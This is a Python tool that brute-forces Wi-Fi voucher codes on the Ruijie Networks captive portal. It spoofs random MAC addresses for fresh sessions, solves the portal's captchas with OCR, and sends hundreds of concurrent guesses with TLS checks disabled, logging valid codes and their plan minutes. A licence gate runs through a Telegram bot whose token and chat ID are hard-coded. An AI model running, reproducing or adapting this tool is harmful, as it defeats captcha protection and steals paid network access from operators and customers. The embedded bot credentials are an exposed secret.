import sys
import getpass
import os
import re
import time
import ping3
import base64
import random
import string
import aiohttp
import asyncio
import hashlib
import requests
import subprocess
import json
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone
from urllib.parse import unquote, urlparse, parse_qs
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from aiohttp import web

# ── Telegram License Config ──
TELEGRAM_BOT_TOKEN = "8286209354:AAHN8V8JR9dSGmr3eknk2Odxrw1w16CHzQI"
TELEGRAM_CHAT_ID = "7774402865"

LICENSE_FILE = ".license"
LOG_FILE = "scanner_history.txt"

# ── Global structures ──
user_data = {}
scan_running = False
stop_scan = False
success_texts = []
limited_texts = []
_start_time = time.monotonic()
CONCURRENCY = 500
BATCH_SIZE = 2000
_voucher_sem = None
scan_task = None
current_mode = None
current_target = None
current_plan_filters = []

# Global Session to prevent "Unclosed connector"
_global_session = None

def get_device_id():
    id_file = ".device_id"
    if os.path.exists(id_file):
        try:
            with open(id_file, "r") as f:
                return f.read().strip()
        except:
            pass
    try:
        result = subprocess.check_output("whoami", shell=True, encoding='utf-8')
        device_id = result.strip()
        if device_id:
            clean_id = re.sub(r'[^A-Za-z0-9]', '', device_id).upper()
            clean_id = (clean_id[:6] if len(clean_id) >= 6 else clean_id.ljust(6, 'X'))
            new_id = f"STR-{clean_id}"
            with open(id_file, "w") as f:
                f.write(new_id)
            return new_id
    except:
        pass
    random_id = "STR-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    with open(id_file, "w") as f:
        f.write(random_id)
    return random_id

def format_remaining(remaining):
    if remaining is None:
        return "Unknown"
    days = remaining.days
    hours = remaining.seconds // 3600
    minutes = (remaining.seconds % 3600) // 60
    if days > 0:
        return f"{days}d {hours}h"
    elif hours > 0:
        return f"{hours}h {minutes}m"
    else:
        return f"{minutes}m"

def get_license_status():
    if not os.path.exists(LICENSE_FILE):
        return None, None, None, None
    try:
        with open(LICENSE_FILE, "r") as f:
            data = f.read().strip().split("|")
            if len(data) != 2:
                return None, None, None, None
            key, exp_ts = data
            exp_dt = datetime.fromtimestamp(float(exp_ts))
            now = datetime.now()
            if now < exp_dt:
                return True, key, exp_dt, exp_dt - now
            else:
                return False, key, exp_dt, None
    except:
        return None, None, None, None

def save_license(key, days):
    exp_dt = datetime.now() + timedelta(days=days)
    with open(LICENSE_FILE, "w") as f:
        f.write(f"{key}|{exp_dt.timestamp()}")
    return exp_dt

def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=5)
    except:
        pass

def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
    params = {"timeout": 10, "offset": offset} if offset else {"timeout": 10}
    try:
        resp = requests.get(url, params=params, timeout=12)
        if resp.status_code == 200:
            return resp.json().get("result", [])
    except:
        pass
    return []

def request_license_via_telegram(user_key):
    device_id = get_device_id()
    msg = f"🔑 *License Request*\n📱 Device: `{device_id}`\n🔐 Key: `{user_key}`\n\nReply: `/allow {user_key} <days>`"
    send_telegram_message(msg)
    print(f"\n📨 Request sent to Telegram. Waiting for admin approval...")
    
    last_update_id = None
    timeout = 120
    start = time.time()
    while time.time() - start < timeout:
        updates = get_updates(offset=last_update_id)
        for update in updates:
            last_update_id = update.get("update_id") + 1
            msg_obj = update.get("message")
            if msg_obj and str(msg_obj.get("chat", {}).get("id")) == TELEGRAM_CHAT_ID:
                text = msg_obj.get("text", "").strip()
                match = re.match(rf"^/allow\s+{re.escape(user_key)}\s+(\d+)$", text, re.I)
                if match:
                    days = int(match.group(1))
                    exp_dt = save_license(user_key, days)
                    send_telegram_message(f"✅ License granted for `{user_key}`. Expires: {exp_dt.strftime('%Y-%m-%d')}")
                    return True
        time.sleep(2)
    return False

PLAN_RE = re.compile(r'^(\d+(mo|min|h|d|m))+$|^unlimit(ed)?$', re.IGNORECASE)

def plan_to_minutes(s):
    if not s: return 0
    s = s.strip().lower()
    if s in ('unlimit', 'unlimited'): return float('inf')
    total = 0
    for val, unit in re.findall(r'(\d+)\s*(mo|min|h|d|m)\b', s):
        val = int(val)
        if unit == 'mo': total += val * 30 * 24 * 60
        elif unit == 'd': total += val * 24 * 60
        elif unit == 'h': total += val * 60
        elif unit in ('min', 'm'): total += val
    return total

def iter_codes(mode):
    if mode in ["6", "7", "8", "9"]:
        length = int(mode)
        if length <= 7:
            codes = [str(i).zfill(length) for i in range(10 ** length)]
            random.shuffle(codes)
            yield from codes
        else:
            while True:
                yield ''.join(random.choices(string.digits, k=length))
        return
    if mode == "starlink":
        while True:
            part1 = ''.join(random.choices(string.ascii_uppercase, k=3))
            part2 = ''.join(random.choices(string.digits, k=3))
            part3 = ''.join(random.choices(string.digits, k=3))
            yield f"{part1}-{part2}-{part3}"
        return
    if mode == "starlink2":
        while True:
            part1 = ''.join(random.choices(string.digits, k=3))
            part2 = ''.join(random.choices(string.digits, k=3))
            part3 = ''.join(random.choices(string.digits, k=3))
            yield f"{part1}-{part2}-{part3}"
        return
    if mode == "ascii-lower":
        while True: yield ''.join(random.choices(string.ascii_lowercase, k=6))
    if mode == "all":
        chars = string.ascii_lowercase + string.digits
        while True: yield ''.join(random.choices(chars, k=6))
    raise ValueError(f"Unsupported scan mode: {mode}")

def print_progress(checked, total=None, speed=0, found=0, target=None, mode=None):
    mode_label = f"STARLINK-{mode.upper()}" if mode in ["starlink", "starlink2"] else f"Mode-{mode}"
    if total:
        progress = (checked / total * 100) if total > 0 else 0
        bar = f"[{'█' * int(progress//2)}{'░' * (50 - int(progress//2))}]"
        status = f"{mode_label} {bar} {progress:.1f}%"
    else:
        status = f"{mode_label} | Checked: {checked:,}"
    status += f" | Found: {found}"
    if target: status += f"/{target}"
    status += f" | Speed: {speed:,.0f}/min"
    print(f"\r{' ' * 120}\r{status}", end="", flush=True)

_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None: return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    return _ocr.classification(buffer.tobytes()).upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(session_obj, session_url, previous_session_id=None):
    mac = get_mac()
    url = replace_mac(session_url, new_mac=mac)
    headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36'}
    try:
        async with session_obj.get(url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            return sid.group(1) if sid else previous_session_id
    except: return previous_session_id

async def Captcha_Image(session_obj, session_id):
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with session_obj.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params) as req:
        return await req.read()

async def Varify_Captcha(session_obj, session_id, text):
    json_data = {'sessionId': session_id, 'authCode': text}
    async with session_obj.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', json=json_data) as req:
        data = await req.json()
        return session_id if data.get("success") == True else None

async def get_balance(session_id):
    global _global_session
    url = f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}"
    try:
        async with _global_session.get(url, timeout=10) as resp:
            data = await resp.json()
            val = data.get('data', {}).get('totalMinutes')
            return f"{val}m" if val else "N/A"
    except: return "N/A"

async def perform_check(session_url, code, plan_filters=None):
    global _global_session, stop_scan
    if stop_scan: return None
    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    
    for _ in range(3):
        if stop_scan: return None
        session_id = await get_session_id(_global_session, session_url)
        if not session_id: continue
        
        auth_code = None
        for _ in range(5):
            try:
                image = await Captcha_Image(_global_session, session_id)
                text = await Captcha_Text(image)
                if text and await Varify_Captcha(_global_session, session_id, text):
                    auth_code = text
                    break
            except: continue
        
        if not auth_code: continue
        data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}
        try:
            async with _global_session.post(post_url, json=data) as req:
                resp_text = await req.text()
                if 'logonUrl' in resp_text:
                    plan = await get_balance(session_id)
                    return {"code": code, "plan": plan}
                elif 'STA' in resp_text:
                    return {"code": code, "status": "limited"}
        except: continue
    return None

async def run_bruteforce(mode, session_url, target=None, plan_filters=None):
    global stop_scan, scan_running, _global_session, _voucher_sem
    try:
        code_iter = iter_codes(mode)
    except: return

    checked, found = 0, 0
    scan_start = time.monotonic()
    
    if _global_session is None:
        _global_session = aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=CONCURRENCY, verify_ssl=False))
    
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    while not stop_scan:
        batch = []
        for _ in range(BATCH_SIZE):
            try: batch.append(next(code_iter))
            except StopIteration: break
        if not batch: break
        
        async def _check(c):
            async with _voucher_sem:
                return await perform_check(session_url, c, plan_filters)
        
        results = await asyncio.gather(*[_check(c) for c in batch])
        for res in results:
            if res and "plan" in res:
                found += 1
                print(f"\n🎉 FOUND: {res['code']} | Plan: {res['plan']}")
                with open("found_codes.txt", "a") as f:
                    f.write(f"{res['code']} | Plan: {res['plan']}\n")
                if target and found >= target:
                    stop_scan = True
                    break
        
        checked += len(batch)
        speed = (checked / (time.monotonic() - scan_start) * 60)
        print_progress(checked, None, speed, found, target, mode)

async def command_handler():
    global stop_scan, _global_session
    valid, key, exp_dt, remaining = get_license_status()
    if not valid:
        user_key = input("> Enter License Key: ").strip()
        if not request_license_via_telegram(user_key): sys.exit(1)
    
    print("\n🤖 Scanner Started! Type 'help' for commands.")
    
    # Initialize global session once
    _global_session = aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=500, verify_ssl=False))
    
    while True:
        try:
            cmd = input("\n> ").strip().lower()
            if cmd == "exit": break
            elif cmd.startswith("setup"):
                user_data["session_url"] = cmd.split()[1]
                print("✅ URL Saved")
            elif cmd.startswith("brute"):
                parts = cmd.split()
                mode = parts[1]
                target = int(parts[2]) if len(parts) > 2 else None
                await run_bruteforce(mode, user_data.get("session_url"), target)
        except KeyboardInterrupt: break
    
    if _global_session:
        await _global_session.close()

if __name__ == "__main__":
    asyncio.run(command_handler())
